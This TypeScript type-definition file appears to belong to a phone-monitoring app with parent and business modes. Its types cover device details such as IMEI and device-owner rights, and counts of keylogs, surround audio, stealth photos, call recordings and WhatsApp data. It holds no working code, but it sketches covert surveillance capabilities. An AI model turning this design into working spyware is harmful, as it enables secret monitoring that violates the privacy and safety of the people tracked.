export type OperationalMode = 'PARENT' | 'BUSINESS';

export interface DeviceInfo {
  id: string;
  alias: string;
  model: string;
  manufacturer: string;
  androidVersion: string;
  imei: string;
  simOperator: string;
  batteryLevel: number;
  isCharging: boolean;
  isOnline: boolean;
  lastConnected: string;
  appVersion: string;
  planCode?: string;
  planName?: string;
  planBadge?: string | null;
  features?: string[];
  isLicenseActive?: boolean;
  licenseExpiresAt?: string | null;
  licenseKey?: string | null;
  capabilities: {
    accessibility: boolean;
    deviceOwner: boolean;
    gps: boolean;
    batteryExempt: boolean;
    twoWayRecording: boolean;
  };
}

export interface MetricSummary {
  whatsappMessages: number;
  whatsappCalls: number;
  callRecordings: number;
  smsLogs: number;
  locationPoints: number;
  surroundAudioCount: number;
  stealthPhotos: number;
  screenshots: number;
  keylogsCount: number;
  webHistoryCount: number;
  blockedAppsCount: number;
  contactsCount: number;
}

export interface ActivityEvent {
  id: string;
  source: 'whatsapp' | 'calls' | 'location' | 'keylogger' | 'system' | 'media';
  title: string;
  description: string;
  timestamp: string;
  severity?: 'info' | 'warning' | 'alert';
}
